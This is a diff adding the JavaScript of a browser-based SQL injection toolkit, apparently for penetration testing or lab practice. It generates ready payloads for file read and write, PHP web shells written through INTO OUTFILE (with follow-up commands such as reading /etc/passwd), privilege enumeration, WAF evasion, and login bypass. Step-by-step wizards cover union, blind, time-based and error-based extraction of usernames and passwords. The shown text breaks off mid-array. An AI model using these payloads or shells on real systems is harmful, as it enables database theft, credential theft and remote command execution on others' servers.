+    payloads.push({payload:`cn' UNION SELECT ${makeUnionCols(cols, vis, `LOAD_FILE('${path}')`)}-- -`, desc:"Ensure file is readable by mysql OS user"});
+  } else {
+    payloads.push({payload:`SELECT LOAD_FILE('${path}')`, desc:`Direct read of ${path}`});
+  }
+  payloads.push({payload:`SELECT LOAD_FILE(0x${strToHex(path)})`, desc:"Hex-encoded path (avoids quote filtering)"});
+  document.getElementById('file-read-output').innerHTML = buildSection(`File Read: ${path}`, payloads);
+}
+
+function strToHex(str) {
+  return Array.from(str).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+}
+
+function generateFileWrite() {
+  const path = document.getElementById('file-write-path').value.trim() || '/var/www/html/proof.txt';
+  const content = document.getElementById('file-write-content').value || 'test';
+  const method = document.getElementById('file-write-method').value;
+  const kw = method === 'outfile' ? 'INTO OUTFILE' : 'INTO DUMPFILE';
+  const payloads = [
+    {payload:`SELECT '${content}' ${kw} '${path}'`, desc:`Write content to ${path}`},
+    {payload:`cn' UNION SELECT 1,'${content}',3,4 ${kw} '${path}'-- -`, desc:"Via UNION injection (4 cols)"},
+    {payload:`cn' UNION SELECT '','${content}','','' ${kw} '${path}'-- -`, desc:"Via UNION — empty junk (cleaner output)"},
+    {payload:`SELECT FROM_BASE64('${btoa(content)}') ${kw} '${path}'`, desc:"Base64-decoded write (bypass quote filters)"},
+  ];
+  document.getElementById('file-write-output').innerHTML = buildSection(`File Write: ${path}`, payloads);
+}
+
+function generateWebShell() {
+  const root = document.getElementById('ws-webroot').value.trim() || '/var/www/html';
+  const fname = document.getElementById('ws-filename').value.trim() || 'shell.php';
+  const type = document.getElementById('ws-type').value;
+  const cols = parseInt(document.getElementById('ws-cols').value) || 4;
+  const path = `${root}/${fname}`;
+
+  const shells = {
+    minimal: `<?php system($_GET[0]); ?>`,
+    exec: `<?php exec($_GET[0], $o); echo implode("\\n",$o); ?>`,
+    passthru: `<?php passthru($_GET[0]); ?>`,
+    eval: `<?php @eval(base64_decode($_POST[0])); ?>`,
+    request: `<?php if(isset($_REQUEST[0])){ echo '<pre>'; system($_REQUEST[0]); echo '</pre>'; } ?>`,
+  };
+  const shell = shells[type] || shells.minimal;
+
+  // Build union payload
+  const a = [];
+  for (let i = 0; i < cols; i++) a.push(i === 0 ? `''` : i === 1 ? `'${shell.replace(/'/g,"\\'")}'` : `''`);
+  // Actually let's put the shell in position 2 always for simplicity
+  const unionParts = Array.from({length: cols}, (_,i) => i === 1 ? `'${shell}'` : `''`).join(',');
+
+  const payloads = [
+    {payload:`SELECT '${shell}' INTO OUTFILE '${path}'`, desc:`Direct write — ${type} shell`},
+    {payload:`cn' UNION SELECT ${unionParts} INTO OUTFILE '${path}'-- -`, desc:`UNION write (${cols} cols, shell in col 2)`},
+    {payload:`cn' UNION SELECT '','${shell}','','' INTO OUTFILE '${path}'-- -`, desc:"4-col variant"},
+  ];
+
+  const fullPath = path;
+  let html = buildSection(`Web Shell: ${fullPath}`, payloads);
+  html += `<div class="info-box" style="margin-top:12px"><strong>Usage after writing:</strong><br>
+  <code style="font-family:var(--mono);color:var(--green)">http://target/${fname}?0=id</code><br>
+  <code style="font-family:var(--mono);color:var(--green)">http://target/${fname}?0=cat+/etc/passwd</code><br>
+  <code style="font-family:var(--mono);color:var(--green)">http://target/${fname}?0=which+nc</code>
+  </div>`;
+  document.getElementById('ws-output').innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════════
+// PRIVILEGES
+// ═══════════════════════════════════════════════════════════
+
+function generatePrivPayloads() {
+  const cols = parseInt(document.getElementById('priv-cols').value) || 4;
+  const vis = parseInt(document.getElementById('priv-vis').value) || 2;
+  const user = document.getElementById('priv-user').value.trim();
+  const mk = (inj, rest='') => `cn' UNION SELECT ${makeUnionCols(cols,vis,inj)}${rest}-- -`;
+  const where = user ? ` WHERE user='${user}'` : '';
+
+  const payloads = [
+    {payload:mk('user()'), desc:"Current user()"},
+    {payload:mk('current_user'), desc:"current_user — may differ"},
+    {payload:`cn' UNION SELECT ${makeUnionCols(cols,vis,'user')} FROM mysql.user-- -`, desc:"All DB users"},
+    {payload:mk('super_priv')+` FROM mysql.user${where}-- -`, desc:"SUPER privilege"},
+    {payload:`cn' UNION SELECT ${makeUnionCols(cols,vis,'privilege_type')} FROM information_schema.user_privileges${user?` WHERE grantee="'${user}'@'localhost'""`:''}-- -`, desc:"All granted privileges"},
+    {payload:mk('variable_value')+` FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -`, desc:"secure_file_priv"},
+    {payload:mk('@@version'), desc:"MySQL version"},
+    {payload:mk('@@version_compile_os'), desc:"OS platform"},
+    {payload:mk('@@hostname'), desc:"Hostname"},
+    {payload:mk('@@datadir'), desc:"Data directory (file paths)"},
+    {payload:mk('@@basedir'), desc:"MySQL base directory"},
+  ];
+  document.getElementById('priv-output').innerHTML = buildSection('Privilege Enumeration Payloads', payloads);
+}
+
+// ═══════════════════════════════════════════════════════════
+// WAF BYPASS
+// ═══════════════════════════════════════════════════════════
+
+const bypassTransforms = [
+  {id:'upper', label:'UPPERCASE', fn: s => s.toUpperCase()},
+  {id:'lower', label:'lowercase', fn: s => s.toLowerCase()},
+  {id:'random', label:'rAnDoM CaSe', fn: s => s.split('').map(c => Math.random()>.5?c.toUpperCase():c.toLowerCase()).join('')},
+  {id:'comment_space', label:'/**/ spaces', fn: s => s.replace(/ /g,'/**/')},
+  {id:'tab_space', label:'%09 spaces', fn: s => s.replace(/ /g,'%09')},
+  {id:'newline_space', label:'%0a spaces', fn: s => s.replace(/ /g,'%0a')},
+  {id:'url_encode', label:'URL Encode', fn: s => encodeURIComponent(s)},
+  {id:'dbl_url', label:'Double URL', fn: s => encodeURIComponent(encodeURIComponent(s))},
+  {id:'hex_str', label:'Strings→Hex', fn: s => s.replace(/'([^']+)'/g, (_,m) => '0x'+strToHex(m))},
+  {id:'char_enc', label:'Strings→CHAR', fn: s => s.replace(/'([^']+)'/g, (_,m) => `CHAR(${Array.from(m).map(c=>c.charCodeAt(0)).join(',')})`)},
+  {id:'version_comment', label:'/*!...*/UNION', fn: s => s.replace(/\bUNION\b/gi, '/*!50000UNION*/')},
+  {id:'comment_break', label:'UN/**/ION', fn: s => s.replace(/\bUNION\b/gi,'UN/**/ION').replace(/\bSELECT\b/gi,'SE/**/LECT')},
+  {id:'between', label:'=→BETWEEN', fn: s => s.replace(/=(\d+)/g,(_,n)=>`BETWEEN ${n} AND ${n}`)},
+];
+
+let activeBypass = new Set();
+
+function initBypassChips() {
+  const c = document.getElementById('bypass-chips');
+  c.innerHTML = bypassTransforms.map(t =>
+    `<span class="bypass-chip" id="chip-${t.id}" onclick="toggleBypass('${t.id}')">${t.label}</span>`
+  ).join('');
+}
+
+function toggleBypass(id) {
+  const chip = document.getElementById('chip-' + id);
+  if (activeBypass.has(id)) { activeBypass.delete(id); chip.classList.remove('active'); }
+  else { activeBypass.add(id); chip.classList.add('active'); }
+}
+
+function applyBypass() {
+  let input = document.getElementById('waf-input').value.trim();
+  if (!input) { showNotif('Enter a payload first', 'error'); return; }
+  const results = [{label:'Original', payload: input}];
+  let current = input;
+  activeBypass.forEach(id => {
+    const t = bypassTransforms.find(x => x.id === id);
+    if (t) { current = t.fn(current); results.push({label: t.label, payload: current}); }
+  });
+  if (results.length === 1) { showNotif('Select at least one bypass technique', 'error'); return; }
+
+  const payloads = results.map(r => ({payload: r.payload, desc: r.label}));
+  document.getElementById('waf-output').innerHTML = buildSection('Transformed Payloads', payloads);
+}
+
+function clearBypass() {
+  activeBypass.clear();
+  document.querySelectorAll('.bypass-chip').forEach(c => c.classList.remove('active'));
+  document.getElementById('waf-input').value = '';
+  document.getElementById('waf-output').innerHTML = '';
+}
+
+function initWafLib() {
+  document.getElementById('waf-lib').innerHTML = DB.waf_bypass.map(p => makePayloadItem(p.payload, p.desc, p.tags||[])).join('');
+}
+
+// ═══════════════════════════════════════════════════════════
+// ENCODER
+// ═══════════════════════════════════════════════════════════
+
+function encodeAll() {
+  const s = document.getElementById('enc-input').value;
+  const safe = (fn, val) => { try { return fn(val); } catch { return '(error)'; } };
+  document.getElementById('out-url').textContent = safe(encodeURIComponent, s);
+  document.getElementById('out-urld').textContent = safe(decodeURIComponent, s);
+  document.getElementById('out-b64').textContent = safe(btoa, unescape(encodeURIComponent(s)));
+  document.getElementById('out-b64d').textContent = safe(v => decodeURIComponent(escape(atob(v))), s);
+  document.getElementById('out-hex').textContent = '0x' + strToHex(s);
+  document.getElementById('out-hexd').textContent = safe(v => {
+    const hex = v.replace(/^0x/i,'');
+    let r = '';
+    for (let i = 0; i < hex.length; i+=2) r += String.fromCharCode(parseInt(hex.substr(i,2),16));
+    return r;
+  }, s);
+  document.getElementById('out-char').textContent = s ? `CHAR(${Array.from(s).map(c=>c.charCodeAt(0)).join(',')})` : '—';
+  document.getElementById('out-durl').textContent = safe(v => encodeURIComponent(encodeURIComponent(v)), s);
+  document.getElementById('out-html').textContent = s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  document.getElementById('out-mhex').textContent = s ? '0x' + strToHex(s) : '—';
+}
+
+// ═══════════════════════════════════════════════════════════
+// PAYLOAD LIBRARY
+// ═══════════════════════════════════════════════════════════
+
+const allPayloads = [
+  ...DB.discovery.map(p => ({...p, cat:'Discovery'})),
+  ...DB.auth.map(p => ({...p, cat:'Auth Bypass'})),
+  ...DB.bool.map(p => ({...p, cat:'Boolean Blind'})),
+  ...DB.time_mysql.map(p => ({...p, cat:'Time-Based (MySQL)'})),
+  ...DB.time_pgsql.map(p => ({...p, cat:'Time-Based (PostgreSQL)'})),
+  ...DB.time_mssql.map(p => ({...p, cat:'Time-Based (MSSQL)'})),
+  ...DB.time_oracle.map(p => ({...p, cat:'Time-Based (Oracle)'})),
+  ...DB.error_mysql.map(p => ({...p, cat:'Error-Based (MySQL)'})),
+  ...DB.error_pgsql.map(p => ({...p, cat:'Error-Based (PostgreSQL)'})),
+  ...DB.error_mssql.map(p => ({...p, cat:'Error-Based (MSSQL)'})),
+  ...DB.file_check.map(p => ({...p, cat:'File Ops — Check'})),
+  ...DB.waf_bypass.map(p => ({...p, cat:'WAF Bypass'})),
+  ...DB.priv.map(p => ({...p, cat:'Privileges'})),
+  // Union payloads
+  ...[{payload:"' ORDER BY 1-- -", desc:"Column detection ORDER BY", cat:'Union Injection'},
+      {payload:"' ORDER BY 2-- -", desc:"Column detection ORDER BY 2", cat:'Union Injection'},
+      {payload:"' ORDER BY 3-- -", desc:"Column detection ORDER BY 3", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,2,3,4-- -", desc:"4-column union test", cat:'Union Injection'},
+      {payload:"' UNION SELECT NULL,NULL,NULL,NULL-- -", desc:"4-column NULL union", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,@@version,3,4-- -", desc:"MySQL version via UNION", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,user(),3,4-- -", desc:"Current user via UNION", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,database(),3,4-- -", desc:"Current DB via UNION", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -", desc:"All databases", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,table_name,table_schema,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -", desc:"Tables in dev DB", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,column_name,table_name,table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -", desc:"Columns in credentials", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,username,password,4 FROM dev.credentials-- -", desc:"Extract credentials", cat:'Union Injection'},
+      {payload:"' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -", desc:"Read /etc/passwd via UNION", cat:'Union Injection'},
+  ],
+];
+
+function searchLib() {
+  const q = document.getElementById('lib-search').value.toLowerCase().trim();
+  const results = q ? allPayloads.filter(p =>
+    p.payload.toLowerCase().includes(q) ||
+    (p.desc||'').toLowerCase().includes(q) ||
+    (p.cat||'').toLowerCase().includes(q)
+  ) : allPayloads;
+
+  document.getElementById('lib-count').textContent = `${results.length} payload${results.length!==1?'s':''} ${q?'matching: '+q:'total'}`;
+
+  // Group by category
+  const bycat = {};
+  results.forEach(p => {
+    if (!bycat[p.cat]) bycat[p.cat] = [];
+    bycat[p.cat].push(p);
+  });
+
+  let html = '';
+  Object.entries(bycat).forEach(([cat, items]) => {
+    html += buildSection(cat, items);
+  });
+  document.getElementById('lib-output').innerHTML = html || '<div class="info-box">No payloads match that query.</div>';
+}
+
+function initLib() {
+  searchLib();
+}
+
+// ═══════════════════════════════════════════════════════════
+// REFERENCE
+// ═══════════════════════════════════════════════════════════
+
+function initReference() {
+  const cmdHtml = DB.reference_mysql.map(r =>
+    `<div class="payload-item">
+      <div style="flex:1">
+        <div class="payload-code">${esc(r.cmd)}</div>
+        <div class="payload-desc">${esc(r.desc)}</div>
+      </div>
+      <button class="btn btn-copy" onclick="copyPayload(this,'${esc(r.cmd).replace(/'/g,"\\'")}')">⎘ Copy</button>
+    </div>`
+  ).join('');
+
+  const opPrec = `<div class="step-list">
+    ${[
+      {n:'1', t:'Division / Multiplication / Modulus', b:'/ * %'},
+      {n:'2', t:'Addition / Subtraction', b:'+ -'},
+      {n:'3', t:'Comparison', b:'= > < <= >= != LIKE'},
+      {n:'4', t:'NOT', b:'!'},
+      {n:'5', t:'AND', b:'&&'},
+      {n:'6', t:'OR (lowest)', b:'||'},
+    ].map(s => `<div class="step"><div class="step-num">${s.n}</div><div class="step-content"><div class="step-title">${s.t}</div><div class="step-body" style="font-family:var(--mono);color:var(--green)">${s.b}</div></div></div>`).join('')}
+  </div>`;
+
+  document.getElementById('reference-content').innerHTML = `
+    <div class="grid-2">
+      <div>
+        <div class="card" style="margin-bottom:12px">
+          <div class="card-header"><div class="card-title">MySQL Command Reference</div></div>
+          <div class="card-body no-pad">${cmdHtml}</div>
+        </div>
+      </div>
+      <div>
+        <div class="card" style="margin-bottom:12px">
+          <div class="card-header"><div class="card-title">Operator Precedence (highest→lowest)</div></div>
+          <div class="card-body">${opPrec}</div>
+        </div>
+        <div class="card" style="margin-bottom:12px">
+          <div class="card-header"><div class="card-title">Comment Syntax</div></div>
+          <div class="card-body no-pad">
+            ${[
+              {payload:'-- -', desc:'MySQL/MariaDB — note trailing space required'},
+              {payload:'#', desc:'MySQL hash — %23 in URL context'},
+              {payload:'/**/', desc:'Inline comment — whitespace substitute'},
+              {payload:'/*!50000...*/', desc:'Version conditional — executes in MySQL ≥5.0.0'},
+            ].map(p => makePayloadItem(p.payload, p.desc)).join('')}
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">INFORMATION_SCHEMA Key Tables</div></div>
+          <div class="card-body no-pad">
+            ${[
+              {payload:'INFORMATION_SCHEMA.SCHEMATA', desc:'All databases — SCHEMA_NAME column'},
+              {payload:'INFORMATION_SCHEMA.TABLES', desc:'All tables — TABLE_NAME, TABLE_SCHEMA'},
+              {payload:'INFORMATION_SCHEMA.COLUMNS', desc:'All columns — COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA'},
+              {payload:'INFORMATION_SCHEMA.USER_PRIVILEGES', desc:'User privileges — GRANTEE, PRIVILEGE_TYPE'},
+              {payload:'INFORMATION_SCHEMA.GLOBAL_VARIABLES', desc:'Server variables — VARIABLE_NAME, VARIABLE_VALUE'},
+              {payload:'mysql.user', desc:'MySQL user table — user, host, super_priv, FILE priv'},
+            ].map(p => makePayloadItem(p.payload, p.desc)).join('')}
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+// ═══════════════════════════════════════════════════════════
+// WIZARD
+// ═══════════════════════════════════════════════════════════
+
+let wizardType = null;
+let wizardStep = 0;
+let wizardSteps = [];
+
+const WIZARDS = {
+  union: {
+    title: '⚡ Union Injection Wizard',
+    steps: [
+      {
+        title: 'Step 1: Confirm Injectable Parameter',
+        desc: 'Add a single quote to the parameter and observe the response. An error or change in behavior confirms injection.',
+        payloads: ["'", "''", "'-- -", "' AND '1'='1'-- -"],
+        why: "A single quote breaks out of the SQL string context. If the server returns a SQL syntax error, the parameter is injectable. Two quotes ('') restores syntax and the page loads normally — this confirms string context injection.",
+        fix: "If no error: try numeric context (no quotes), check different parameters, try double quotes.",
+      },
+      {
+        title: 'Step 2: Detect Column Count (ORDER BY)',
+        desc: 'Increment ORDER BY until an error occurs. The last successful number = column count.',
+        payloads: ["' ORDER BY 1-- -","' ORDER BY 2-- -","' ORDER BY 3-- -","' ORDER BY 4-- -","' ORDER BY 5-- -","' ORDER BY 6-- -"],
+        why: "ORDER BY N sorts by the Nth column. If N exceeds the number of columns in the SELECT, MySQL throws 'Unknown column' error. This gives you the exact column count without knowing the query.",
+        fix: "If ORDER BY fails immediately: try UNION SELECT 1, UNION SELECT 1,2 method instead.",
+      },
+      {
+        title: 'Step 3: Confirm with UNION SELECT',
+        desc: 'Replace numbers with NULLs matching your column count. Success = UNION works.',
+        payloads: ["' UNION SELECT NULL-- -","' UNION SELECT NULL,NULL-- -","' UNION SELECT NULL,NULL,NULL-- -","' UNION SELECT NULL,NULL,NULL,NULL-- -","' UNION SELECT 1,2,3,4-- -"],
+        why: "UNION requires equal column counts and compatible data types. NULLs are type-safe for all columns. Once it works, replace NULLs with numbers to find visible positions.",
+        fix: "If UNION fails: WAF may be filtering it. Try UNION/**/SELECT, UNION%09SELECT, or !50000UNION*/ SELECT.",
+      },
+      {
+        title: 'Step 4: Identify Visible Columns',
+        desc: 'Inject position markers. The numbers that appear on the page = usable injection columns.',
+        payloads: ["' UNION SELECT 1,2,3,4-- -","' UNION SELECT 'COL1','COL2','COL3','COL4'-- -"],
+        why: "Many apps only display specific columns (e.g., product name and description, not ID). You must identify which column position maps to a displayed field — that's where your extracted data will appear.",
+        fix: "If nothing visible: the app may suppress results. Try error-based or blind injection instead.",
+      },
+      {
+        title: 'Step 5: Fingerprint the DBMS',
+        desc: 'Extract version and user info to confirm MySQL and plan your enumeration queries.',
+        payloads: ["' UNION SELECT 1,@@version,3,4-- -","' UNION SELECT 1,user(),3,4-- -","' UNION SELECT 1,database(),3,4-- -","' UNION SELECT 1,@@hostname,3,4-- -"],
+        why: "Different databases use different system tables and functions. @@version confirms MySQL/MariaDB vs MSSQL. database() gives the current DB name to start enumeration from.",
+        fix: "MSSQL: @@version works but uses sys.tables not information_schema.tables in some versions.",
+      },
+      {
+        title: 'Step 6: Enumerate Schema',
+        desc: 'List all databases, then tables, then columns. Use INFORMATION_SCHEMA.',
+        payloads: [
+          "' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -",
+          "' UNION SELECT 1,table_name,3,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -",
+          "' UNION SELECT 1,column_name,3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -",
+        ],
+        why: "INFORMATION_SCHEMA is a meta-database available in all MySQL/MariaDB instances. It contains metadata about every table, column, and database. This is your roadmap to all stored data.",
+        fix: "Can't access INFORMATION_SCHEMA? Try mysql.innodb_table_stats or GROUP_CONCAT with LIMIT offsets.",
+      },
+      {
+        title: 'Step 7: Extract Data',
+        desc: 'Target the table and columns you identified. Use GROUP_CONCAT to get all rows.',
+        payloads: [
+          "' UNION SELECT 1,username,password,4 FROM dev.credentials-- -",
+          "' UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3,4 FROM dev.credentials-- -",
+          "' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4 FROM dev.credentials-- -",
+        ],
+        why: "Using db.table notation lets you query across databases. GROUP_CONCAT collects all rows into one cell — critical when only one row is displayed per page. 0x3a is the hex for ':' to avoid quote issues.",
+        fix: "GROUP_CONCAT truncated? Default max is 1024 chars. Use LIMIT 0,1 and increment to extract record by record.",
+      },
+    ]
+  },
+  auth: {
+    title: '🔓 Auth Bypass Wizard',
+    steps: [
+      {
+        title: 'Step 1: Inject Single Quote',
+        desc: "Add a ' to the username field. If the page returns a SQL error, the login form is injectable.",
+        payloads: ["'", "''", '"'],
+        why: "A single quote terminates the string literal in the SQL query, causing a syntax error if input is passed directly into the query without sanitization.",
+        fix: "No error? Try double quote, or look at the page source — error may be hidden in HTML comments.",
+      },
+      {
+        title: 'Step 2: Try Comment Truncation',
+        desc: "If you know a valid username, use it + comment to bypass password check.",
+        payloads: ["admin'-- -", "admin'#", "admin'/*"],
+        why: "The comment (-- ) causes MySQL to ignore everything after it, including AND password='...'. The query becomes: SELECT * FROM users WHERE username='admin'",
+        fix: "If admin doesn't work as the target user, try: administrator, root, user, test, guest.",
+      },
+      {
+        title: 'Step 3: OR Operator Bypass',
+        desc: "Use OR to make the WHERE clause always true, even without knowing a username.",
+        payloads: ["' OR '1'='1", "' OR '1'='1'-- -", "' OR 1=1-- -", "' OR 1-- -"],
+        why: "MySQL evaluates AND before OR. The injected OR '1'='1' is always true, so the entire WHERE clause returns true, causing the database to return the first user record.",
+        fix: "If only one result shown and it's not admin: the app uses the first returned row. Try adding ORDER BY id DESC to get the highest-privileged account.",
+      },
+      {
+        title: 'Step 4: Handle Parenthesis Contexts',
+        desc: "If the query wraps conditions in parentheses, you need to close them first.",
+        payloads: ["admin')-- -", "') OR ('1'='1", "admin') OR ('1'='1'-- -"],
+        why: "Some queries look like: WHERE (username='...' AND id>1). The ')' closes the open paren before the comment, preventing syntax errors. Always test with syntax error analysis.",
+        fix: "Keep adding ')' until no syntax error. Or look at the error message — it often shows the query structure.",
+      },
+      {
+        title: 'Step 5: WAF Bypass Auth',
+        desc: "If a WAF is blocking, apply encoding or comment tricks to the bypass payloads.",
+        payloads: ["'/**/OR/**/'1'='1", "'%09OR%09'1'='1", "' oR '1'='1", "' OR 1 BETWEEN 1 AND 1-- -"],
+        why: "WAFs match exact patterns. Replacing spaces with comments (/**/) or tabs (%09), or using mixed case, bypasses signature-based rules while keeping valid SQL syntax.",
+        fix: "Still blocked? Try double URL encoding: %2527 for quote, CHAR(39) for quote, or hex-encoded values.",
+      },
+    ]
+  },
+  'blind-bool': {
+    title: '👁 Boolean Blind Wizard',
+    steps: [
+      {
+        title: 'Step 1: Confirm Boolean Injection',
+        desc: "Send true/false conditions and observe if the page responds differently.",
+        payloads: ["' AND 1=1-- -", "' AND 1=2-- -"],
+        why: "If the page loads normally for 1=1 (true) and shows a different result (empty, error, or different content) for 1=2 (false), the injection is boolean-blind injectable. The page acts as a binary oracle.",
+        fix: "Subtle differences? Check page length, specific elements, or HTTP response codes — not just visible content.",
+      },
+      {
+        title: 'Step 2: Test Table/Data Existence',
+        desc: "Confirm target tables and rows exist before extraction.",
+        payloads: [
+          "' AND (SELECT COUNT(*) FROM users)>0-- -",
+          "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>2-- -",
+          "' AND (SELECT COUNT(*) FROM credentials)>0-- -",
+        ],
+        why: "Existence checks help you map the database structure before extracting data. Each returns TRUE or FALSE — use the page difference as your oracle.",
+        fix: "Table doesn't exist → false response. Try common table names: users, admin, accounts, members, logins.",
+      },
+      {
+        title: 'Step 3: Determine Data Length',
+        desc: "Find the length of the target value before extracting characters.",
+        payloads: [
+          "' AND LENGTH((SELECT password FROM users LIMIT 0,1))>0-- -",
+          "' AND LENGTH((SELECT password FROM users LIMIT 0,1))>16-- -",
+          "' AND LENGTH((SELECT password FROM users LIMIT 0,1))=32-- -",
+        ],
+        why: "Knowing the length prevents wasted requests. Binary search: test >16, if true test >24, etc. For MD5 hashes length=32, SHA1=40, bcrypt starts with $2.",
+        fix: "Use binary search (halving): >16 true? Then >24. >24 false? Then >20. Converges in log2(length) requests.",
+      },
+      {
+        title: 'Step 4: Extract Characters (Binary Search)',
+        desc: "Extract each character using ASCII values and binary search.",
+        payloads: [
+          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>64-- -",
+          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96-- -",
+          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>112-- -",
+          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))=97-- -",
+        ],
+        why: "Binary search on ASCII values: start at 128, go up or down by halving until you find the exact value. Each character takes ~7 requests with binary search vs 127 with linear. ASCII 97-122 = a-z, 65-90 = A-Z, 48-57 = 0-9.",
+        fix: "Characters out of printable range? The data may be binary/hex encoded. Try extracting HEX(SUBSTRING(...)) and convert.",
+      },
+      {
+        title: 'Step 5: Iterate Across All Characters',
+        desc: "Repeat Step 4 for each character position until full value extracted.",
+        payloads: [
+          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),2,1))>64-- -",
+          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),3,1))>64-- -",
+        ],
+        why: "The second parameter in SUBSTRING is the character position (1-indexed). Increment it to extract each character sequentially. Automate this with Burp Intruder or a custom script.",
+        fix: "Use Burp Suite Intruder with a sniper attack on the position index and ASCII value for automation.",
+      },
+    ]
+  },
+  'blind-time': {
+    title: '⏱ Time-Based Blind Wizard',
+    steps: [
+      {
+        title: 'Step 1: Confirm Time-Based Injection',
+        desc: "Send a SLEEP payload and measure the response time.",
+        payloads: ["' AND SLEEP(5)-- -", "' OR SLEEP(5)-- -", "1 AND SLEEP(5)-- -"],
+        why: "If the response takes 5+ seconds, the injection is time-based blind injectable. This works even when the page shows no error and no content difference — pure latency as the oracle.",
+        fix: "Network latency masking it? Try SLEEP(10) or SLEEP(15). Use Burp Suite's response timer for precision.",
+      },
+      {
+        title: 'Step 2: Conditional Sleep (True/False)',
+        desc: "Use IF() to sleep only on true conditions.",
+        payloads: [
+          "' AND IF(1=1,SLEEP(5),0)-- -",
+          "' AND IF(1=2,SLEEP(5),0)-- -",
+          "' AND IF(database()='dev',SLEEP(5),0)-- -",
+        ],
+        why: "IF(condition, true_action, false_action) — if condition is true, SLEEP(5) executes and response is delayed; if false, SLEEP(0) executes immediately. This gives you a reliable binary oracle via timing.",
+        fix: "Response times inconsistent? Increase sleep duration, or use bitwise extraction (AND...>>N&1) for more reliable results.",
+      },
+      {
+        title: 'Step 3: Extract Data Length via Timing',
+        desc: "Determine value length before character extraction.",
+        payloads: [
+          "' AND IF(LENGTH((SELECT password FROM users LIMIT 0,1))>5,SLEEP(5),0)-- -",
+          "' AND IF(LENGTH((SELECT password FROM users LIMIT 0,1))=32,SLEEP(5),0)-- -",
+        ],
+        why: "Same binary search approach as boolean, but using delay as the signal. 32 = MD5 hash length. Determine length first to bound your character extraction loop.",
+        fix: "Binary search on length: test >16 (sleep=injectable? yes), test >24 (sleep? no), test >20 (sleep? yes) → length ~21-24.",
+      },
+      {
+        title: 'Step 4: Extract Characters via Timing',
+        desc: "Extract each character by sleeping when the ASCII value matches.",
+        payloads: [
+          "' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96,SLEEP(5),0)-- -",
+          "' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>112,SLEEP(5),0)-- -",
+          "' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))=97,SLEEP(5),0)-- -",
+        ],
+        why: "Binary search on character values using timing. Each character requires ~7 requests (log2(128)). Total for 32-char MD5: ~224 requests. Consider sqlmap --technique=T for automation.",
+        fix: "For PostgreSQL: pg_sleep(5). For MSSQL: WAITFOR DELAY '00:00:05'. For Oracle: DBMS_LOCK.SLEEP(5).",
+      },
+    ]
+  },
+  error: {
+    title: '💥 Error-Based Wizard',
+    steps: [
+      {
+        title: 'Step 1: Trigger a SQL Error',
+        desc: "Cause a syntax error to confirm the app displays SQL error messages.",
+        payloads: ["'", "' AND 1=CONVERT(INT,'a')-- -", "' AND EXTRACTVALUE(0,0)-- -"],
+        why: "Error-based injection requires verbose error messages in the response. If the app shows 'You have an error in your SQL syntax' or similar, you can use error-based techniques to exfiltrate data through error text.",
+        fix: "No errors displayed? Check HTML source, JavaScript responses, or HTTP headers — errors sometimes appear there.",
+      },
+      {
+        title: 'Step 2: EXTRACTVALUE (MySQL)',
+        desc: "Use EXTRACTVALUE() to force data into the error message.",
+        payloads: [
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))-- -",
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -",
+        ],
+        why: "EXTRACTVALUE(xml, xpath) throws an error when xpath is invalid. By injecting the data into the xpath position using CONCAT(), the data appears in the error message: 'XPATH syntax error: ~data~'. The 0x7e is the tilde ~ used as a delimiter.",
+        fix: "Output truncated at 32 chars? Use SUBSTRING(data,1,32) and increment to extract longer values.",
+      },
+      {
+        title: 'Step 3: Enumerate via Error',
+        desc: "Extract table names, column names, and data through error messages.",
+        payloads: [
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -",
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))-- -",
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))-- -",
+        ],
